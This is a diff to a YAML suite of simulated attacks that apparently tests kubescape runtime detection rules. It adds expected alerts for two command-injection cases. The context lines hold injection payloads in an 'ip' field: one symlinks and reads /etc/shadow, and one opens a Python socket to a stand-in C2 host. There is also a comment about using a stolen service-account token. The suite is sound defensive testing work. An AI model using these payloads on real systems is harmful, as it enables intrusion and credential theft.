@@ -232,7 +232,18 @@ attacks:
         ip: "127.0.0.1;ln -sf /etc/shadow /tmp/shadow_link && cat /tmp/shadow_link && rm -f /tmp/shadow_link"
     successIndicators:
       - statusCode: 200
-    expectedDetections: []
+    # R1010 fires when a symlink resolves to a sensitive file (/etc/shadow,
+    # /etc/passwd, …) — the cat reads via /tmp/shadow_link but kubescape
+    # follows the symlink. R0001 also catches the direct exec of cat.
+    expectedDetections:
+      - ruleID: R1010
+        ruleName: Symlink Created Over Sensitive File
+        containerName: mywebapp-app
+        command: cat
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: mywebapp-app
+        command: cat
 
   # ═══════════════════════════════════════════════════════════════════════════
   # Phase 8: DISCOVERY (TA0007) — Environment enumeration
@@ -492,7 +503,18 @@ attacks:
         ip: "127.0.0.1;python3 -c \"import socket,os;s=socket.socket();s.settimeout(2);s.connect(('c2.evil.example.com',4444))\" 2>/dev/null || python -c \"print('python_not_available')\" 2>/dev/null || echo no_python"
     successIndicators:
       - statusCode: 200
-    expectedDetections: []
+    # Image may have python3 OR python (or neither). Assert both — whichever
+    # exec lands, R0001 catches it as unexpected. Matches the bash and perl
+    # reverse-shell probes elsewhere in this suite.
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: mywebapp-app
+        command: python3
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: mywebapp-app
+        command: python
 
   # T1613 — K8s API enumeration with stolen SA token
   # After stealing the token (cmdinject-sa-token), use it to enumerate.
